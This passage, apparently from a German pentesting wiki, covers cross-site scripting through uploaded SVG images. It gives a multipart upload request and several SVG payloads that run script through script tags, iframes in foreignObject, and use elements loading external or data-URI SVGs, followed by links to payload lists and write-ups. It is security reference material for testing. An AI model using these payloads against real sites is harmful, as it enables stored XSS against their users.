Lade als Bild eine Datei wie die folgende hoch (von [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```html
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```html
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```html
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x" /></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Finde **mehr SVG payloads in** [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Sonstige JS-Tricks & Relevante Infos


{{#ref}}
other-js-tricks.md
{{#endref}}

## XSS-Ressourcen

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
- [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
- [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
- [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
- [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
- [https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide](https://www.intigriti.com/researchers/blog/hacking-tools/hunting-for-blind-cross-site-scripting-xss-vulnerabilities-a-complete-guide)

## Referenzen

- [Eine harmlose XSS hinter einer WAF in einen realistischen Phishing-Vektor verwandeln](https://blog.hackcommander.com/posts/2025/12/28/turning-a-harmless-xss-behind-a-waf-into-a-realistic-phishing-vector/)
- [XSS und SSRF über den List-Unsubscribe SMTP-Header in Horde Webmail und Nextcloud Mail](https://security.lauritz-holtmann.de/post/xss-ssrf-list-unsubscribe/)
- [HackerOne-Bericht #2902856 - Nextcloud Mail List-Unsubscribe SSRF](https://hackerone.com/reports/2902856)
- [Von "Low-Impact" RXSS zu Credential Stealer: Ein JS-in-JS Walkthrough](https://r3verii.github.io/bugbounty/2025/08/25/rxss-credential-stealer.html)
- [MDN eval()](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval)
- [CAPIG XSS: postMessage origin trust wird zu einem Script-Loader + Backend-JS-Konkatenation ermöglicht supply-chain stored XSS](https://ysamm.com/uncategorized/2026/01/13/capig-xss.html)
- [MobSF stored XSS über manifest analysis (unsafe Django safe sink)](https://github.com/advisories/GHSA-8hf7-h89p-3pqj)

{{#include ../../banners/hacktricks-training.md}}
